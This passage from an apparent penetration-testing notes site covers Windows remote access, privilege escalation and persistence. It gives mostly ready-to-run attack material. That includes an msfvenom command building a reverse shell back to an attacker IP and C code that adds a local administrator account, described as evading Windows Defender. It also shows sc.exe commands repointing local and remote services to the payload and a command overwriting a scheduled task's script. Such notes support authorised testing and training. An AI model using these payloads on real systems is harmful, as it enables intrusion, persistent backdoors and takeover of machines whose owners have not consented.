<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">                   $</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_USER</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">,</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">SECURE_PASSWORD</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Enter an interactive PowerShell session on the $TARGET_HOST.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Enter-PSSession</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">ComputerName </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">                -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Credential </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">CREDENTIAL_OBJECT</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Alternately, we can pass commands directly as &quot;script</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># blocks&quot;. Note that the $POWERSHELL_SCRIPT does not have</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># access to any variables in the host script or session, as</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># its sent to $TARGET_HOST for execution (though this can be</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># worked around using the -ArgumentList parameter, if</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># necessary).</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Invoke-Command</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">ComputerName </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">               -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Credential </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">CREDENTIAL_OBJECT</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">               -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">ScriptBlock </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">{</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">                    $</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">POWERSHELL_SCRIPT</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">                }</span></span></code></pre></figure><a href="../spellbook/how-to-use-windows-remote-management/../../spells/how-to-use-winrm-with-powershell" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="evil-winrm">Evil-WinRM<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#evil-winrm" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="file-transfers-in-evil-winrm" data-block data-embed-alias="undefined"><h1>File transfers in Evil-WinRM</h1><p><a href="../spells/file-transfers-in-evil-winrm/../../spellbook/evil-winrm" class="internal alias" data-slug="spellbook/evil-winrm">Evil-WinRM</a> <em>does</em> have a built-in download command for transferring files, but it’s <em>sloooow</em>…</p><a href="../spellbook/how-to-use-windows-remote-management/../../spells/file-transfers-in-evil-winrm" class="internal transclude-src">Link to original</a></blockquote><p></p><a href="../spellbook/how-to-use-windows-remote-management" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="services-1">Services<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#services-1" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="how-to-exploit-windows-services" data-block data-embed-alias="undefined"><h1>How to exploit Windows services</h1><h2 id="local-services">Local services<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#local-services" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="how-to-manipulate-local-windows-services" data-block data-embed-alias="undefined"><h1>How to manipulate local Windows services</h1><p>Existing <a href="../spellbook/how-to-manipulate-local-windows-services/../../spellbook/windows-services" class="internal alias" data-slug="spellbook/windows-services">Windows services</a> can have backdoors added to them using <a href="../spellbook/how-to-manipulate-local-windows-services/../../spellbook/metasploit" class="internal alias" data-slug="spellbook/metasploit">Metasploit</a>’s <a href="../spellbook/how-to-manipulate-local-windows-services/../../spellbook/msfvenom" class="internal" data-slug="spellbook/msfvenom">msfvenom</a>. Begin by finding a candidate service:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Get a list of all available services</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">sc.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> query state</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">all</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Query information about an existing service. We want a</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># service with three properties:</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#    1. The BINARY_PATH_NAME points to our payload,</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#    2. The START_TYPE is &quot;auto&quot; so it runs without user</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#       interaction, and</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#    3. The SERVICE_START_NAME (the account which the service</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#       runs under) is &quot;LocalSystem&quot;.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Note that not every service can be queried, however; the</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># ability to do so is controlled by a special per-service</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># permission (a Discressionary Access Control List, or DACL).</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">sc.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> qc </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">SERVICE_NAME</span></span></code></pre></figure>
<p>Create a replacement service file using <a href="../spellbook/how-to-manipulate-local-windows-services/../../spellbook/msfvenom" class="internal" data-slug="spellbook/msfvenom">msfvenom</a> (alternately, a backdoor could be added directly to the binary):</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="vitesse-light vitesse-light"><code data-language="bash" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#59873A;--shiki-dark:#59873A;">msfvenom</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> -p</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;"> windows/x64/shell_reverse_tcp</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> \</span></span>
<span data-line><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">	LHOST=</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">$ATTACKER_IP</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;"> LPORT=</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">$ATTACKER_PORT</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> \</span></span>
<span data-line><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;">	-f</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;"> exe-service</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> -o</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;"> $SERVICE_EXE</span></span></code></pre></figure>
<p>The use of <code>exe-service</code> here rather than <code>exe</code> ensures that <a href="../spellbook/how-to-manipulate-local-windows-services/../../spellbook/windows-services" class="internal alias" data-slug="spellbook/windows-services">the correct APIs</a> are available. Alternately, if you’re not trying to be stealthy than a simple application can be used instead (this will run successfully, but register as a failure in the <a href="../spellbook/how-to-manipulate-local-windows-services/../../spellbook/windows-event-logs" class="internal alias" data-slug="spellbook/windows-event-logs">Windows event logs</a>).</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="c" data-theme="vitesse-light vitesse-light"><code data-language="c" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">#</span><span style="--shiki-light:#1E754F;--shiki-dark:#1E754F;">include</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &lt;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">stdlib.h</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">int</span><span style="--shiki-light:#59873A;--shiki-dark:#59873A;"> main</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">()</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> {</span></span>
<span data-line><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">	int</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> i</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">	i </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#59873A;--shiki-dark:#59873A;"> system</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">net user USERNAME PASSWORD /add</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">);</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">	i </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#59873A;--shiki-dark:#59873A;"> system</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">net localgroup administrators USERNAME /add</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">);</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#1E754F;--shiki-dark:#1E754F;">	return</span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;"> 0</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">;</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">}</span></span></code></pre></figure>
<p>USERNAME and PASSWORD obviously need to be updated to fit the current use case. Unlike <a href="../spellbook/how-to-manipulate-local-windows-services/../../spellbook/msfvenom" class="internal" data-slug="spellbook/msfvenom">msfvenom</a> payloads, as of August 17th 2022 binaries compiled from this code are <em>not</em> detected as malicious by <a href="../spellbook/how-to-manipulate-local-windows-services/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> Defender.</p>
<p>Finally, update the service definition:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># NOTE: A space is required after equals signs for this</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># command! It's not just a weird typo below!</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">sc.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> config </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">SERVICE_NAME</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">	binPath</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">PATH_TO_REVERSE_SHELL_EXE</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">	start</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> auto obj</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">LocalSystem</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">`</span></span></code></pre></figure>
<p>If the service executable is specified with an <a href="../spellbook/how-to-manipulate-local-windows-services/../../spells/unquoted-path-handling-in-windows" class="internal alias" data-slug="spells/unquoted-path-handling-in-windows">unquoted path</a>, then it’s only necessary to place the malicious binary earlier in the implicit search path.</p><a href="../spellbook/how-to-exploit-windows-services/../../spellbook/how-to-manipulate-local-windows-services" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="remote-services">Remote services<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#remote-services" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="how-to-manipulate-remote-windows-services" data-block data-embed-alias="undefined"><h1>How to manipulate remote Windows services</h1><blockquote class="callout tip" data-callout="tip">
<div class="callout-title">
                  <div class="callout-icon"></div>
                  <div class="callout-title-inner"><p>IMPORTANT</p></div>
                  
                </div>
<div class="callout-content">
<p>By default, UAC restricts remote sc.exe calls to domain admins and the default local “Administrator” account. <em>Local <a href="../spellbook/how-to-manipulate-remote-windows-services/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> admins cannot call this service remotely without first disabling UAC!</em></p>
</div>
</blockquote>
<p>The sc.exe command can also be used to create and manipulate services on <em>remote</em> machines. This uses the <a href="../spellbook/how-to-manipulate-remote-windows-services/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> RPC (<a href="../spellbook/how-to-manipulate-remote-windows-services/../../spellbook/tcp" class="internal alias" data-slug="spellbook/tcp">TCP</a> 135), but will fall back to named pipes over <a href="../spellbook/how-to-manipulate-remote-windows-services/../../spellbook/cifs" class="internal alias" data-slug="spellbook/cifs">SMB</a> (<a href="../spellbook/how-to-manipulate-remote-windows-services/../../spellbook/tcp" class="internal alias" data-slug="spellbook/tcp">TCP</a> 445) or NetBIOS (<a href="../spellbook/how-to-manipulate-remote-windows-services/../../spellbook/tcp" class="internal alias" data-slug="spellbook/tcp">TCP</a> 139). (In fact, this is how sc.exe works locally as well; the only difference is that in this case a local named pipe is always used.)</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Create $ATTACKER_SERVICE on the $TARGET_HOST.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">sc.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> \\</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> create </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">ATTACKER_SERVICE</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">                      binPath</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">SOME_COMMAND</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> start</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> auto</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Invoke $ATTACKER_SERVICE.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">sc.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> \\</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> start </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">ATTACKER_SERVICE</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Make sure that $ATTACKER_SERVICE is really dead.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">sc.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> \\</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> stop </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">ATTACKER_SERVICE</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Clean up after yourself.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">sc.exe</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> \\</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> delete </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">ATTACKER_SERVICE</span></span></code></pre></figure>
<p>Note that this is a blind attack — there will be no output indicating success or failure.</p><a href="../spellbook/how-to-exploit-windows-services/../../spellbook/how-to-manipulate-remote-windows-services" class="internal transclude-src">Link to original</a></blockquote><p></p><a href="../spellbook/how-to-exploit-windows-services" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="tasks">Tasks<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#tasks" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="how-to-exploit-windows-tasks" data-block data-embed-alias="undefined"><h1>How to exploit Windows tasks</h1><h2 id="local-tasks">Local tasks<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#local-tasks" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="how-to-manipulate-local-windows-tasks" data-block data-embed-alias="undefined"><h1>How to manipulate local Windows tasks</h1><p>Use the built-in <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks" class="external" target="_blank">schtasks<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> command to create and manipulate <a href="../spellbook/how-to-manipulate-local-windows-tasks/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> tasks (basically the equivalent of *NIX cron jobs).</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># List scheduled tasks</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">schtasks</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># View details about a scheduled task</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">schtasks </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">query </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">tn </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TASK_NAME</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">fo list </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">v</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Check the permissions of an executable</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">icacls </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">PATH_TO_BINARY</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Modify the permissions (if possible/desired)</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">icacls </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">PATH_TO_BINARY</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">grant </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">GROUP</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">:</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">PERMISSION</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># You can overwrite files in Windows in the same way you'd do</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># in Linux (however, this can cause issues with line</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># endings... probably best to just use notepad.exe here</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># instead)</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">echo </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">MALICIOUS_BINARY_AND_ARGUMENTS</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> ></span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">PATH_TO_BAT_TO_OVERWRITE</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Force a task to run (iff the current user has permission to</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># do so)</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">schtasks </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">run </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">tn </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TASK_NAME</span></span></code></pre></figure>
<p>If a task points to a file that you’ve obtained write access to, then that file can be altered without changing the underlying task.</p>
<p>It may also be possible to create your own tasks.</p>
